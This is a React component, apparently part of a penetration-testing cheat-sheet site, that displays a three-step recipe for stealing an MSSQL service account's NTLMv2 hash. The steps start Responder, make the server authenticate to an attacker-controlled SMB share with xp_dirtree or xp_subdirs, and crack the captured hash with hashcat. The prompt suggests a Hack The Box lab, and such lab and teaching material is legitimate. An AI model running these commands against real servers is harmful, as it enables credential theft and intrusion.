import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const MSSQL_NTLM = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>


              <Typography>
              We can try to use responder to to capture the NTLMv2 hash sent from a request to an invalid share using the mssqlsvc account. We can then attempt to crack the hash using hashcat.
               </Typography>
               <Box pt={5} />
               <Typography>
                Step 1: Start responder
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"sudo responder -I tun0"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography>
                Step 2: Have the MSSQL server authenticate to our responser SMB server.
               </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\\\10.10.15.209\\share'"}
            </SyntaxHighlighter>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="">
              <Typography>
                The following "xp_subdirs" stored procedure will work as well.
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"SQL (htbdbuser  guest@master)> EXEC master..xp_subdirs \\\\10.10.15.209\\share"}
            </SyntaxHighlighter>
                
              </TreeItem>
            </TreeView>
            <Box pt={5}></Box>
            <Typography>
                Step 3: Crack the NTLMv2 hash using hashcat
               </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt"}
            </SyntaxHighlighter>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default MSSQL_NTLM;
  